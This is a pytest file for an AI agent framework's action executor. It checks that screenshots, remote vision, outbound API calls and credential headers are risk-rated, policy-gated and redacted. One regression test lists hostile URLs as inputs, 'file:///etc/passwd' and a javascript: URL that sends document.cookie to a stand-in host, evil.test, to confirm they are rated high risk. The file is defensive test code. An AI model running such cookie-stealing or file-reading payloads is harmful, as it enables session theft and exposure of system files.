"""computer.state (perception as an audited action, deniable by policy) and api.request (risk by
method, host and credentials; secrets never logged) — through the one executor."""

from __future__ import annotations

import http.server
import json
import threading
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from highhx.actions.executor import ActionExecutor
from highhx.actions.handlers.state import state_from_result
from highhx.actions.policy import Risk
from highhx.computer.model import Observation, UIElement
from highhx.computer.providers import Capability
from highhx.safety.actions import Actor
from highhx.safety.audit import AuditLog
from highhx.safety.gate import ActionGate, ApprovalMode
from tests.unit.agent.conftest import RecordingUI
from tests.unit.perception.fakes import png


class FakeBrowser:
    def __init__(self) -> None:
        self.screenshots = 0

    def capability(self) -> Capability:
        return Capability("browser", True, "fake chrome")

    def observe(self, *, cancel: Any = None) -> Observation:
        return Observation(
            "chrome",
            "Chrome",
            "Shop",
            "https://shop.test/",
            [UIElement("e1", "button", "Add to cart", bounds=(10, 10, 80, 20)), UIElement("e2", "link", "Docs")],
            text="Add to cart Docs",
        )

    def screenshot(self, *, cancel: Any = None) -> bytes:
        self.screenshots += 1
        return png()

    def list_tabs(self, *, cancel: Any = None) -> list[dict[str, Any]]:
        return [{"id": "T1", "url": "https://shop.test/", "title": "Shop", "active": True}]


class FakeSession:
    def __init__(self) -> None:
        self.browser = FakeBrowser()
        self.cancel = None

    def close(self) -> None:
        pass


def _executor(make_app, root: Path, *, actor: Actor = Actor.USER, ui: RecordingUI | None = None) -> tuple[ActionExecutor, RecordingUI, FakeSession]:
    app = make_app(root)
    ui = ui or RecordingUI()
    gate = ActionGate(app.engine, ui, source="test", mode=ApprovalMode.ASK, audit=AuditLog(app.db, app.redactor))
    session = FakeSession()
    return ActionExecutor(app, gate, actor=actor, computer=lambda: session, sleep=lambda _s: None), ui, session


def test_computer_state_returns_a_fused_state(agent_project: Path, make_app) -> None:
    executor, ui, session = _executor(make_app, agent_project)
    result = executor.run("computer.state", {"surface": "browser"})
    assert result.ok and ui.requests == []
    state = state_from_result(result)
    assert state is not None and state.url == "https://shop.test/" and state.browser.tabs[0].active
    assert [e.name for e in state.elements] == ["Add to cart", "Docs"] and state.screenshot is None
    assert session.browser.screenshots == 0  # no pixels unless asked


def test_screenshots_are_persisted_and_bounded(agent_project: Path, make_app) -> None:
    executor, _, _ = _executor(make_app, agent_project)
    result = executor.run("computer.state", {"surface": "browser", "screenshot": True})
    state = state_from_result(result)
    assert state.screenshot is not None and Path(state.screenshot.path).is_file()
    assert state.screenshot.width == 80


def test_a_policy_can_deny_screen_capture(agent_project: Path, make_app) -> None:
    (agent_project / ".highhx" / "policies.yaml").write_text(
        "rules:\n  - id: no-pixels\n    effect: deny\n    when: {action: 'screen:capture'}\n    message: no screenshots here\n"
    )
    executor, _, session = _executor(make_app, agent_project)
    denied = executor.run("computer.state", {"surface": "browser", "screenshot": True})
    assert denied.status == "blocked" and "screen:capture" in denied.error and session.browser.screenshots == 0
    assert executor.run("computer.state", {"surface": "browser"}).ok  # structure only is still allowed


def test_a_remote_vision_request_is_high_risk(agent_project: Path, make_app) -> None:
    executor, _, _ = _executor(make_app, agent_project)
    planned = executor.plan("computer.state", {"surface": "browser", "vision": "auto", "remote_vision": True})
    assert planned.decision.risk == Risk.HIGH and planned.asks


def test_android_state_without_android_support_is_a_clear_error(agent_project: Path, make_app) -> None:
    executor, _, _ = _executor(make_app, agent_project)
    result = executor.run("computer.state", {"surface": "android"})
    assert not result.ok and "Android" in result.error


# ------------------------------------------------------------------ api.request
class Handler(http.server.BaseHTTPRequestHandler):
    seen: list[dict[str, Any]] = []

    def _reply(self, status: int, body: dict[str, Any]) -> None:
        data = json.dumps(body).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:
        Handler.seen.append({"method": "GET", "path": self.path, "auth": self.headers.get("Authorization")})
        self._reply(404 if self.path == "/missing" else 200, {"ok": True, "path": self.path})

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length") or 0)
        Handler.seen.append({"method": "POST", "body": self.rfile.read(length).decode()})
        self._reply(201, {"created": True})

    def log_message(self, *args: Any) -> None:
        pass


@pytest.fixture
def server() -> Iterator[str]:
    Handler.seen = []
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{httpd.server_address[1]}"
    finally:
        httpd.shutdown()
        httpd.server_close()


def test_loopback_get_runs_without_asking(agent_project: Path, make_app, server: str) -> None:
    executor, ui, _ = _executor(make_app, agent_project)
    result = executor.run("api.request", {"url": f"{server}/items"})
    assert result.ok and result.output["status"] == 200 and result.output["json"]["path"] == "/items"
    assert ui.requests == [] and result.output["network"] == [{"url": f"{server}/items", "method": "GET", "status": 200}]
    missing = executor.run("api.request", {"url": f"{server}/missing"})
    assert not missing.ok and missing.output["status"] == 404
    assert executor.run("api.request", {"url": f"{server}/missing", "expect_status": 404}).ok


def test_changes_and_credentials_are_high_risk_and_asked(agent_project: Path, make_app, server: str, monkeypatch) -> None:
    executor, ui, _ = _executor(make_app, agent_project)
    ui.action_answers = [False]
    declined = executor.run("api.request", {"url": f"{server}/orders", "method": "POST", "json": {"sku": 1}})
    assert declined.status == "denied" and Handler.seen == []  # nothing was sent
    created = executor.run("api.request", {"url": f"{server}/orders", "method": "POST", "json": {"sku": 1}})
    assert created.ok and created.output["status"] == 201 and Handler.seen[-1]["body"] == '{"sku": 1}'
    monkeypatch.setenv("SHOP_TOKEN", "tok-very-secret-123")
    planned = executor.plan("api.request", {"url": f"{server}/me", "headers_from_env": {"Authorization": "SHOP_TOKEN"}})
    assert planned.decision.risk == Risk.HIGH
    events: list[Any] = []
    executor.events.subscribe("*", events.append)
    authed = executor.run("api.request", {"url": f"{server}/me", "headers_from_env": {"Authorization": "SHOP_TOKEN"}})
    assert authed.ok and Handler.seen[-1]["auth"] == "tok-very-secret-123"
    assert "tok-very-secret-123" not in executor.app.redactor.redact("Bearer tok-very-secret-123")
    assert all("tok-very-secret-123" not in json.dumps(e.data, default=str) for e in events)


def test_external_reads_are_medium_and_policy_names_hosts(agent_project: Path, make_app) -> None:
    executor, _, _ = _executor(make_app, agent_project)
    planned = executor.plan("api.request", {"url": "https://api.example.com/v1/items"})
    assert planned.decision.risk == Risk.MEDIUM
    assert planned.spec.policy_name(planned.inputs) == "network:api.example.com"
    (agent_project / ".highhx" / "policies.yaml").write_text(
        "rules:\n  - id: no-example\n    effect: deny\n    when: {action: 'network:*.example.com'}\n"
    )
    executor2, _, _ = _executor(make_app, agent_project)
    assert executor2.run("api.request", {"url": "https://api.example.com/v1/items"}).status == "blocked"


def test_only_http_urls(agent_project: Path, make_app) -> None:
    executor, _, _ = _executor(make_app, agent_project)
    result = executor.run("api.request", {"url": "file:///etc/passwd"})
    assert not result.ok and "http" in result.error


def test_extracting_from_a_url_is_classified_like_opening_it(agent_project: Path, executor_for) -> None:
    """Regression (security audit): ``browser.extract`` with ``url`` navigates, but was rated as a
    plain read with no target — the privileged-scheme and sensitive-URL rules of ``browser.open``
    never saw the URL."""
    executor, _ = executor_for(agent_project)
    for url in ("file:///etc/passwd", "javascript:fetch('//evil.test/'+document.cookie)"):
        opened = executor.plan("browser.open", {"url": url})
        extracted = executor.plan("browser.extract", {"url": url})
        assert extracted.decision.risk >= opened.decision.risk >= Risk.HIGH, (url, extracted.decision.risk, opened.decision.risk)
    plain = executor.plan("browser.extract", {})
    assert plain.decision.risk == Risk.SAFE  # reading the page already shown stays a read
    https = executor.plan("browser.extract", {"url": "https://example.com/report"})
    assert https.decision.risk == executor.plan("browser.open", {"url": "https://example.com/report"}).decision.risk
